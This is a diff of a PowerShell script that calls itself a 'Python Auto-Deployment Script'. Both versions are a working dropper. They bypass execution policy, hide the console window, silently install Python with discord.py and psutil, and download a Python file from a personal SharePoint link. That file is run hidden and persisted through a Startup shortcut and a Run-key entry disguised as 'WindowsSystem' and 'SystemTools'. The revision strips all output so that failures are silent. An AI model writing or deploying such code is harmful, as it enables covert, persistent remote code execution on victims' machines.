@@ -1,232 +1,131 @@
-# Bypass execution policy for Windows 10/11
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+<# 
+.SYNOPSIS
+    Python Auto-Deployment Script
+.DESCRIPTION 
+    Installs Python and runs a script automatically
+#>
 
-# Python Script Runner with Startup Persistence - Windows 10/11 Compatible
-# Save as .ps1 file and run
+# Bypass execution policy silently
+try { Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue } catch {}
 
-# Simple window hiding that works on all Windows versions
+# Hide window immediately using simpler method
 try {
-    $signature = @'
+    $api = Add-Type -Name "WinApi" -MemberDefinition @"
 [DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
 [DllImport("kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-'@
-    $type = Add-Type -MemberDefinition $signature -Name "Win32" -Namespace Win32Functions -PassThru
-    $consolePtr = $type::GetConsoleWindow()
-    $type::ShowWindow($consolePtr, 0)  # 0 = hide window
-} catch {
-    # Continue silently if hiding fails
-}
+public static extern System.IntPtr GetConsoleWindow();
+"@ -PassThru
+    $hwnd = $api::GetConsoleWindow()
+    $api::ShowWindow($hwnd, 0)  # 0 = hide
+} catch {}
 
-# Function to check if Python is installed
-function Test-Python {
+# Function to check Python
+function Test-PythonInstalled {
     try {
-        # Try to actually run Python and get version
-        $result = cmd /c "python --version 2>&1"
-        if ($LASTEXITCODE -eq 0) {
-            Write-Host "Python found: $result" -ForegroundColor Green
-            return $true
-        }
-    } catch {
-        # Continue to next check
-    }
+        $null = & { python --version 2>$null }
+        return $true
+    } catch { }
     
     try {
-        # Try python3
-        $result = cmd /c "python3 --version 2>&1"
-        if ($LASTEXITCODE -eq 0) {
-            Write-Host "Python found: $result" -ForegroundColor Green
-            return $true
-        }
-    } catch {
-        # Continue to next check
-    }
+        $null = & { python3 --version 2>$null }  
+        return $true
+    } catch { }
     
     return $false
 }
 
-# Function to install Python silently
-function Install-Python {
-    Write-Host "Installing Python..." -ForegroundColor Yellow
-    
-    # Use full Python installer (not embedded) for better compatibility
-    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
-    $installerPath = "$env:TEMP\python_installer.exe"
-    
+# Function to install Python
+function Install-PythonSilently {
     try {
-        # Download Python installer
-        Write-Host "Downloading Python installer..." -ForegroundColor Yellow
-        Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -UseBasicParsing
+        $url = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
+        $path = "$env:TEMP\python-setup.exe"
         
-        # Install Python for current user only (no admin required)
-        Write-Host "Installing Python silently..." -ForegroundColor Yellow
-        $process = Start-Process -FilePath $installerPath -ArgumentList @(
-            "/quiet",
-            "InstallAllUsers=0",
-            "PrependPath=1",
-            "Include_test=0",
-            "Include_pip=1",
-            "Include_launcher=0",
-            "SimpleInstall=1"
+        # Download
+        (New-Object Net.WebClient).DownloadFile($url, $path)
+        
+        # Install silently
+        $proc = Start-Process -FilePath $path -ArgumentList @(
+            "/quiet", "InstallAllUsers=0", "PrependPath=1", 
+            "Include_test=0", "Include_pip=1", "Include_launcher=0"
         ) -Wait -PassThru -WindowStyle Hidden
         
-        if ($process.ExitCode -eq 0) {
-            Write-Host "Python installed successfully" -ForegroundColor Green
-            
-            # Wait a bit for installation to complete
-            Start-Sleep -Seconds 5
-            
-            # Refresh environment to recognize Python in PATH
-            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
-            
+        if ($proc.ExitCode -eq 0) {
+            Start-Sleep -Seconds 8
             return $true
-        } else {
-            Write-Host "Python installer failed with exit code: $($process.ExitCode)" -ForegroundColor Red
-            return $false
         }
-    } catch {
-        Write-Host "Failed to install Python: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
+    } catch { }
+    return $false
 }
 
-# Function to install dependencies
-function Install-Dependencies {
-    Write-Host "Installing Python packages..." -ForegroundColor Yellow
-    
-    $packages = @("discord.py", "psutil")
-    
+# Function to install packages
+function Install-PythonPackages {
+    $packages = "discord.py", "psutil"
     foreach ($pkg in $packages) {
-        Write-Host "Installing $pkg..." -ForegroundColor Yellow
-        
-        # Method 1: Using pip directly
         try {
-            $process = Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", $pkg, "--quiet", "--user" -Wait -PassThru -WindowStyle Hidden
-            if ($process.ExitCode -eq 0) {
-                Write-Host "✓ $pkg installed successfully" -ForegroundColor Green
-                continue
-            }
-        } catch {
-            # Continue to next method
-        }
-        
-        # Method 2: Using pip with --no-cache-dir
-        try {
-            $process = Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", $pkg, "--quiet", "--user", "--no-cache-dir" -Wait -PassThru -WindowStyle Hidden
-            if ($process.ExitCode -eq 0) {
-                Write-Host "✓ $pkg installed successfully" -ForegroundColor Green
-                continue
-            }
-        } catch {
-            # Continue to next method
-        }
-        
-        Write-Host "⚠ Could not install $pkg, but continuing..." -ForegroundColor Yellow
+            Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", $pkg, "--quiet", "--user" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+        } catch { }
     }
 }
 
-# Function to add to startup (works on Win 10/11)
-function Add-Startup {
-    param($ScriptPath)
+# Function to setup startup
+function Setup-StartupPersistence {
+    $scriptPath = "$env:USERPROFILE\ProcessManager.py"
     
-    Write-Host "Setting up startup persistence..." -ForegroundColor Yellow
-    
-    # Method 1: Startup folder (most reliable, no admin needed)
+    # Method 1: Startup folder
     try {
-        $startupPath = [Environment]::GetFolderPath("Startup")
-        $shortcutPath = "$startupPath\WindowsSystem.lnk"
-        
-        $WshShell = New-Object -ComObject WScript.Shell
-        $Shortcut = $WshShell.CreateShortcut($shortcutPath)
-        $Shortcut.TargetPath = "python"
-        $Shortcut.Arguments = "`"$ScriptPath`""
-        $Shortcut.WindowStyle = 7  # Minimized
-        $Shortcut.WorkingDirectory = "$env:USERPROFILE"
-        $Shortcut.Save()
-        Write-Host "✓ Startup shortcut created successfully" -ForegroundColor Green
+        $startup = [Environment]::GetFolderPath("Startup")
+        $shell = New-Object -ComObject WScript.Shell
+        $shortcut = $shell.CreateShortcut("$startup\WindowsSystem.lnk")
+        $shortcut.TargetPath = "python"
+        $shortcut.Arguments = "`"$scriptPath`""
+        $shortcut.WindowStyle = 7
+        $shortcut.WorkingDirectory = "$env:USERPROFILE"
+        $shortcut.Save()
         return $true
-    } catch {
-        Write-Host "Startup folder method failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
+    } catch { }
     
-    # Method 2: Registry (fallback)
+    # Method 2: Registry
     try {
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $regName = "SystemTools"
-        $regValue = "python `"$ScriptPath`""
-        
-        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
-        Write-Host "✓ Registry startup entry added" -ForegroundColor Green
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemTools" -Value "python `"$scriptPath`"" -PropertyType String -Force -ErrorAction SilentlyContinue
         return $true
-    } catch {
-        Write-Host "Registry method failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
+    } catch { }
     
     return $false
 }
 
 # Main execution
 try {
-    # Check if Python is available
-    if (Test-Python) {
-        Write-Host "✓ Python is available" -ForegroundColor Green
-    } else {
-        Write-Host "Python not found, installing..." -ForegroundColor Yellow
-        $pythonInstalled = Install-Python
-        
-        if (-not $pythonInstalled) {
-            Write-Host "❌ Python installation failed!" -ForegroundColor Red
-            exit 1
+    # Check and install Python if needed
+    if (-not (Test-PythonInstalled)) {
+        if (Install-PythonSilently) {
+            Start-Sleep -Seconds 3
         }
-        
-        # Verify Python works after installation
-        if (-not (Test-Python)) {
-            Write-Host "❌ Python not found after installation!" -ForegroundColor Red
-            exit 1
-        }
-        
-        Write-Host "✓ Python installed successfully" -ForegroundColor Green
     }
     
-    # Install dependencies
-    Install-Dependencies
+    # Install packages
+    Install-PythonPackages
     
-    # Download the main script
-    Write-Host "Downloading main script..." -ForegroundColor Yellow
+    # Download main script
+    $url = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1"
+    $path = "$env:USERPROFILE\ProcessManager.py"
     
-    $scriptUrl = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1"
-    $scriptPath = "$env:USERPROFILE\ProcessManager.py"
-    
-    # Download the script
     try {
-        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
-        Write-Host "✓ Script downloaded to: $scriptPath" -ForegroundColor Green
+        (New-Object Net.WebClient).DownloadFile($url, $path)
     } catch {
-        Write-Host "❌ Failed to download script: $($_.Exception.Message)" -ForegroundColor Red
-        exit 1
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction SilentlyContinue
+        } catch { }
     }
     
-    if (Test-Path $scriptPath) {
-        Write-Host "Running script..." -ForegroundColor Green
-        
-        # Run the script hidden
-        Start-Process -FilePath "python" -ArgumentList "`"$scriptPath`"" -WindowStyle Hidden
-        Write-Host "✓ Script started successfully!" -ForegroundColor Green
-        
-        # Add to startup
-        if (Add-Startup -ScriptPath $scriptPath) {
-            Write-Host "✓ Startup persistence configured!" -ForegroundColor Green
-        } else {
-            Write-Host "⚠ Failed to configure startup, but script is running" -ForegroundColor Yellow
-        }
-    } else {
-        Write-Host "❌ Script file not found after download" -ForegroundColor Red
+    # Run script and setup startup
+    if (Test-Path $path) {
+        Start-Process -FilePath "python" -ArgumentList "`"$path`"" -WindowStyle Hidden
+        Setup-StartupPersistence
     }
-    
 } catch {
-    Write-Host "❌ Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
+    # Silent failure
 }
 
-Write-Host "Setup completed!" -ForegroundColor Green
-Start-Sleep -Seconds 3
+# Exit
+Start-Sleep -Seconds 2
